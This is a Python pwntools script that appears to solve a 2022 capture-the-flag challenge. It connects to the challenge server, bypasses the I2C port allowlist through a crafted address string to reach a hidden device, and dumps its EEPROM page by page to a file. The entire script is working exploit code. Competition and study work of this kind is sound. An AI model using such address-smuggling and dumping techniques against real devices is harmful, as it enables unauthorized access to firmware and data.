from pwn import *
t = remote('weather.2022.ctfcompetition.com', 1337)
context.log_level = 'error'

def read_from_addr(addr, len):
	t.recvuntil(b'? ')
	t.sendline(f'r {addr} {len}'.encode())
	t.recvuntil(b'i2c status: ')
	status = t.recvline().strip()
	ret_data = t.recvuntil(b'\n-end\n', drop = True).decode().strip().split()
	return status, ret_data

def write_to_addr(addr, data):
	t.recvuntil(b'? ')
	t.sendline(f'w {addr} {len(data)} {" ".join([str(x) for x in data])}'.encode())
	t.recvuntil(b'i2c status: ')
	status = t.recvline().strip()
	return status

def discover_hidden_port():
	# the hidden port is 33
	for i in range(128):
		status, data = read_from_addr(f'101000000{i}', 128)
		# if transaction is done properly, msg: transaction completed / ready
		if status != b'error - device not found':
			print(f'Device exists on address {i}')

f = open('eeprom.bin', 'wb')
for i in range(64):
	# use i2c to read eeprom pagewise
	# 1st step: write the page number to the port
	write_to_addr('10100000033', [i])
	# 2nd step: read the data back from the specified page number
	status, data = read_from_addr('10100000033', 64)
	print(f'page={i}')
	data_1 = bytes([int(a) for a in data])
	print(data_1)
	f.write(data_1)
	f.flush()
f.close()
